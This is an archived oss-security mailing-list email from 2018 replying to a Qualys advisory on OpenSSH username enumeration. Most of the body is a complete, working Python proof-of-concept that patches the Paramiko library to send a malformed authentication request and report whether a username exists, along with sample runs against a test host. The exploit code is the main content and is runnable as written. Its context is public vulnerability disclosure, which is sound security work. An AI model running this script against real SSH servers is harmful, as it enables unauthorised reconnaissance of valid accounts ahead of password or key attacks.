X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3914" "Thursday" "16" "August" "2018" "23:43:07" "+1200" "Matthew Daley" "mattd@bugfuzz.com" "<CAD3CanckcSk0T5sGa4LxsShYhkTDc8u6Fgdz=jvJ90buwDiH1g@mail.gmail.com>" "117" "Re: [oss-security] OpenSSH Username Enumeration" "^Date:" nil nil "8" "2018081611:43:07" "[oss-security] OpenSSH Username Enumeration" (number mark "        mattd@bugfuz Aug 16  117/3914  " thread-indent "\"Re: [oss-security] OpenSSH Username Enumeration\"\n") "<20180815160558.GA23020@localhost.localdomain>" ("<20180815160558.GA23020@localhost.localdomain>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 25870 invoked by uid 550); 16 Aug 2018 11:43:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 25850 invoked from network); 16 Aug 2018 11:43:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=bugfuzz-com.20150623.gappssmtp.com; s=20150623;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
        bh=cs7PA8CZN1QxhW/72oq0Qo5RJIZ4p/CargVsM5DuBO4=;
        b=2HB55vQLRvq7iBfAkHNxqk2VZbHkx+jDtdPB0QhpapTweGy/zyixy/sD7BrnfKaeyl
         XBU6E5PHoS7V07f+90yMJo7qqtFTROLudnVYPdnKDWUyAqwRr9cf3tr/IEuiPZfEWl7o
         Pf8wcBRHggzUuId+f+VyQLyfeRkmUnZ+lHePdFviR9PUa/Tpue18t0YQcf+b/wijMboX
         o2iFQvtrjj7xrfCR0OPblO9k6JKw4Q/C0cRQvtg+tu+QMUOrafwvyreMGy0w42vNFCxr
         gHilQAVmwMRYBwtMNz21qWt+nPCNlzvF8aN5fMQvUB2HBbrqEZLG+ha32itMcO23q6aa
         mHMQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to;
        bh=cs7PA8CZN1QxhW/72oq0Qo5RJIZ4p/CargVsM5DuBO4=;
        b=OGryDmePQ9DEcOV6+hJfdvqmErC9s4XSaLxkiP6wi0KiEdA9nh8QJAXOEgH4DyPqXE
         3cWRXvPJRcV67/USFR8guhk+OovyrK/w7BT99DR7BhrxZecDHTQH2s27bQSrgYJ4TRLR
         BA21KuN59jbnJBpfk8+XmsPniPnCc+J4Fz6LnVOwaWZippDJlQ+eo+rAjK+gcBwnSKsy
         NUDxdiwizIgz+eijNC6JK9tCbYRFq2uNlgjCI8zy6gVfp3p96mhWQPR+FtnoBnAP25Yn
         zoQFAQJJFQ4xAkmu90ZRdhP8Ru+hUGH0sBodzIxoqT3+fiDDveitKuBpxMpS1HEK7XMY
         I4dw==
X-Gm-Message-State: AOUpUlFNVV6otTXJQrPzrMJsXuEOAxPlk4N50ZMUrn7cgmNq/H55gjFj
	YYC4dCZPtzZk9eYhmbvv61JKUyr0wn6+A9FR/IqQPAKHqNA=
X-Google-Smtp-Source: AA+uWPwgxGxS/63BBN/qGFytjzfWlrH5QLvKGLx5Xa+UQkitpv6xP6oosnW+nTbZCM/nS4nXczTZAUrY1/0oqdArcWE=
X-Received: by 2002:a2e:9b04:: with SMTP id u4-v6mr20447887lji.78.1534419808173;
 Thu, 16 Aug 2018 04:43:28 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <20180815160558.GA23020@localhost.localdomain>
References: <20180815160558.GA23020@localhost.localdomain>
Message-ID: <CAD3CanckcSk0T5sGa4LxsShYhkTDc8u6Fgdz=jvJ90buwDiH1g@mail.gmail.com>
Content-Type: text/plain; charset="UTF-8"
Date: Thu, 16 Aug 2018 23:43:07 +1200
From: Matthew Daley <mattd@bugfuzz.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] OpenSSH Username Enumeration
To: oss-security@lists.openwall.com

On 16 August 2018 at 04:05, Qualys Security Advisory <qsa@qualys.com> wrote:
> The attacker can try to authenticate a user with a malformed packet (for
> example, a truncated packet), and:
>
> - if the user is invalid (it does not exist), then userauth_pubkey()
>   returns immediately, and the server sends an SSH2_MSG_USERAUTH_FAILURE
>   to the attacker;
>
> - if the user is valid (it exists), then sshpkt_get_u8() fails, and the
>   server calls fatal() and closes its connection to the attacker.

I've written a POC for this issue, located at
https://bugfuzz.com/stuff/ssh-check-username.py . It requires the
Paramiko library (http://www.paramiko.org/) to be available. It does
some gross monkey patching of Paramiko to force it into sending an
invalid `SSH2_MSG_USERAUTH_REQUEST` and intercepting the potentially
resultant `SSH2_MSG_USERAUTH_FAILURE` but seems to work well enough. A
sample usage is as follows:

$ nc test.internal 22
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
^C
$ ./ssh-check-username.py test.internal root
[+] Valid username
$ ./ssh-check-username.py test.internal www-data
[+] Valid username
$ ./ssh-check-username.py test.internal thisisinvalid
[*] Invalid username

The POC is also included below for archival purposes.

--- 8< ---

#!/usr/bin/env python

# Copyright (c) 2018 Matthew Daley
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.


import argparse
import logging
import paramiko
import socket
import sys


class InvalidUsername(Exception):
    pass


def add_boolean(*args, **kwargs):
    pass


old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)


def userauth_failure(*args, **kwargs):
    raise InvalidUsername()


paramiko.auth_handler.AuthHandler._handler_table.update({
    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
})

logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('hostname', type=str)
arg_parser.add_argument('--port', type=int, default=22)
arg_parser.add_argument('username', type=str)
args = arg_parser.parse_args()

sock = socket.socket()
try:
    sock.connect((args.hostname, args.port))
except socket.error:
    print '[-] Failed to connect'
    sys.exit(1)

transport = paramiko.transport.Transport(sock)
try:
    transport.start_client()
except paramiko.ssh_exception.SSHException:
    print '[-] Failed to negotiate SSH transport'
    sys.exit(2)

try:
    transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
except InvalidUsername:
    print '[*] Invalid username'
    sys.exit(3)
except paramiko.ssh_exception.AuthenticationException:
    print '[+] Valid username'
